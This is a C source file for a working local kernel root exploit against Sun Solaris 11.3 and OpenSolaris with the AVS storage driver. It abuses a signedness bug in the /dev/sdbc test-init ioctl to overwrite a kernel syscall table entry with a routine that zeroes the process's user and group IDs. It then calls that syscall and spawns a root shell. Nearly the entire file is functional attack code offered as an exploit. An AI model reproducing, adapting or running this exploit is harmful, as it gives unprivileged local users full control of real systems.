/* sdbc-testinit-v2.c
 *
 * Copyright (c) 2008-2017 by <mu-b@digit-labs.org>
 *
 * Sun Solaris <= 11.3 AVS local kernel root exploit
 * by mu-b - Tue 16 May 2017
 *
 * $Id: sdbc-testinit-v2.c 37 2018-07-23 20:08:39Z mu-b $
 *
 * - Tested on: Solaris 5.11 11.3 + AVS (i86pc)
 *              Opensolaris snv_104 + AVS (i86pc)
 *
 * hmmm, this has gotta be test code!?%$!
 *
 * This was originally found in OpenSolaris and later ported to Solaris with the
 * exception that we now have to exploit a signedness bug in the devarray index
 * parameter whereas previously it was unbounded! (see sdbc-testinit.c).
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2008-2017!@$!
 */

#include <stdio.h>
#include <stdlib.h>

#include <fcntl.h>
#include <libelf.h>
#include <limits.h>
#include <string.h>
#include <stropts.h>
#include <sys/elf.h>
#include <sys/mman.h>
#include <sys/param.h>
#include <sys/syscall.h>
#include <unistd.h>

#define SDBC(a)         (('B'<<16)|('C'<<8)|(a))
#define SDBC_TEST_INIT  SDBC(5)

typedef struct _sdbc_ioctl {
  long arg0;
  long arg1;
  long arg2;
  long arg3;
  long arg4;
  long magic;
  long ustatus;
  long pad[1];
} _sdbc_ioctl_t;

typedef struct _sysent_s {
  char sy_narg;
#ifdef _LP64
  unsigned short sy_flags;
#else
  unsigned char sy_flags;
#endif
  int (*sy_call)();
  void *sy_lock;
  void *sy_callc;
} _sysent_t;

#ifdef _LP64
# define KTHREAD  0x18
#else
# define KTHREAD  0x10
#endif

#define XSTRINGY(a)     STRINGY(a)
#define STRINGY(a)      #a

int
pown_kernel (void)
{
#ifdef _LP64
  __asm__ ( "mov %gs:" XSTRINGY(KTHREAD) ", %rax\n"
            "mov 0x1c8(%rax), %rax\n"
            "movl $0x0, 0x4(%rax)\n"    /* kthread_t->t_cred->cr_uid */
            "movl $0x0, 0x8(%rax)\n"    /* kthread_t->t_cred->cr_gid */
            "movl $0x0, 0xc(%rax)\n"    /* kthread_t->t_cred->cr_ruid */
            "movl $0x0, 0x10(%rax)");   /* kthread_t->t_cred->cr_rgid */
#else
  __asm__ ( "mov %gs:" XSTRINGY(KTHREAD) ", %eax\n"
            "mov 0xdc(%eax), %eax\n"
            "mov 0x14(%eax), %eax\n"
            "movl $0x0, 0x4(%eax)\n"
            "movl $0x0, 0x8(%eax)\n"
            "movl $0x0, 0xc(%eax)\n"
            "movl $0x0, 0x10(%eax)");
#endif
  return (0);
}

static void *
resolve_kernsymbl (char *name)
{
  Elf_Scn *scn = NULL;
  Elf *elf;
  void *r = NULL;
  int fd;

  fd = open ("/dev/ksyms", O_RDONLY);
  if (fd < 0)
    {
      fprintf (stderr, "failed opening /dev/ksyms\n");
      return (NULL);
    }

  elf_version (EV_CURRENT);

  if ((elf = elf_begin (fd, ELF_C_READ, NULL)) == NULL)
    {
      fprintf (stderr, "elf_begin failed\n");
      goto done;
    }

  while ((scn = elf_nextscn (elf, scn)) != 0)
    {
#ifdef _LP64
      Elf64_Shdr *shdr;
      if ((shdr = elf64_getshdr (scn)) != 0)
#else
      Elf32_Shdr *shdr;
      if ((shdr = elf32_getshdr (scn)) != 0)
#endif
        {
          if (shdr->sh_type == SHT_SYMTAB)
            {
              Elf_Data *data = NULL;

              if ((data = elf_getdata (scn, data)) == 0 || data->d_size == 0)
                continue;

#ifdef _LP64
              Elf64_Sym *esym = (Elf64_Sym *) data->d_buf;
              Elf64_Sym *lastsym = (Elf64_Sym *) ((char *) data->d_buf + data->d_size);
#else
              Elf32_Sym *esym = (Elf32_Sym *) data->d_buf;
              Elf32_Sym *lastsym = (Elf32_Sym *) ((char *) data->d_buf + data->d_size);
#endif

              for (; esym < lastsym; esym++)
                {
                  if (esym->st_value == 0 ||
#ifdef _LP64
                      (ELF64_ST_TYPE(esym->st_info) == STT_FUNC)) 
#else
                      (ELF32_ST_TYPE(esym->st_info) == STT_FUNC)) 
#endif
                    continue;

                  if (strcmp (name, elf_strptr (elf, shdr->sh_link, (size_t) esym->st_name)) == 0)
                    {
                      r = (void *) esym->st_value;
                      goto done;
                    }
                }
            }
        }
    }

done:
  elf_end (elf);
  close (fd);

  return (r);
}

int
main (int argc, char **argv)
{
  void *devarrayp, *sysentp, *ptr, *targetp;
  int align, fd, id, n, sysindx;
  _sdbc_ioctl_t sdbc_ioctl;
  _sysent_t sysent;
  long devindx;

  printf ("Sun (Open)Solaris <= 11.3 AVS local kernel root exploit\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2008-2017!@$!\n\n");

  fd = open ("/dev/sdbc", O_RDONLY);
  if (fd < 0)
    {
      fprintf (stderr, "%s: failed opening /dev/sdbc\n", argv[0]);
      return (EXIT_FAILURE);
    }

  memset (&sysent, 0, sizeof (sysent));
  sysent.sy_narg = 0;
  sysent.sy_flags = 0;
  sysent.sy_call = pown_kernel;
  sysent.sy_lock = pown_kernel;
  sysent.sy_callc = pown_kernel;

  devarrayp = resolve_kernsymbl ("devarray");
  if (devarrayp == NULL)
    {
      fprintf (stderr, "%s: failed resolving &devarray\n", argv[0]);
      return (EXIT_FAILURE);
    }

  sysentp = resolve_kernsymbl ("sysent");
  if (sysentp == NULL)
    {
      fprintf (stderr, "%s: failed resolving &sysent\n", argv[0]);
      return (EXIT_FAILURE);
    }

  /* devarray elements are 256-bytes in size, so we can only write at an offset
   * aligned to devarrayp & 0xff */
  targetp = (void *) (((long) sysentp & ~0xFF) | ((long) devarrayp & 0xFF));
  targetp += 0x1700;
  sysindx = ((long) targetp - (long) sysentp) / sizeof (sysent);
  devindx = ((char *) targetp - (char *) devarrayp) / 256;
  devindx = (long) LONG_MIN + devindx;

  ptr = mmap (NULL, PAGESIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
  if (ptr == (void *) -1)
    {
      fprintf (stderr, "failed mmap\n");
      return (EXIT_FAILURE);
    }

  memset (ptr, 0, PAGESIZE);

  align = ((long) sysentp & 0x0F) - ((long) devarrayp & 0x0F);
  if (align < 0)
    align = -align;
  memcpy ((ptr + PAGESIZE) - sizeof (sysent) - align, &sysent, sizeof (sysent));

  memset (&sdbc_ioctl, 0, sizeof (sdbc_ioctl));
  sdbc_ioctl.arg0 = (long) (ptr + PAGESIZE) - sizeof (sysent);
  sdbc_ioctl.arg1 = devindx;
  sdbc_ioctl.arg2 = sizeof (sysent) * 2;
#ifdef _LP64
  printf ("* devarray: 0x%016lX, sysent: 0x%016lX, target: 0x%016lX\n", (long) devarrayp, (long) sysentp, (long) targetp);
  printf ("* devarray idx: %ld %016lX\n", devindx, devindx);
#else
  printf ("* devarray: 0x%08lX, sysent: 0x%08lX, target: 0x%08lX\n", (long) devarrayp, (long) sysentp, (long) targetp);
  printf ("* devarray idx: %ld %08lX\n", devindx, devindx);
#endif
  printf ("* sysent idx: %u\n", sysindx);

  printf ("\n* overwriting... ");
  n = ioctl (fd, SDBC_TEST_INIT, &sdbc_ioctl);
  if (n != -1)
    {
      printf ("failed, ouch (%d)\n", n);
      return (EXIT_FAILURE);
    }
  printf ("done\n");

  printf ("* jumping... ");
  syscall (sysindx);
  printf ("done\n");

  id = getuid ();
  printf ("* getuid(): %d\n", id);
  if (id == 0)
    {
      char *args[2] = { "/bin/sh", NULL };
      printf ("+Wh00t\n\n");

      execve (args[0], args, NULL);
    }
  else
    fprintf (stderr, "%s: failed to obtain root :(\n", argv[0]);

  return (EXIT_SUCCESS);
}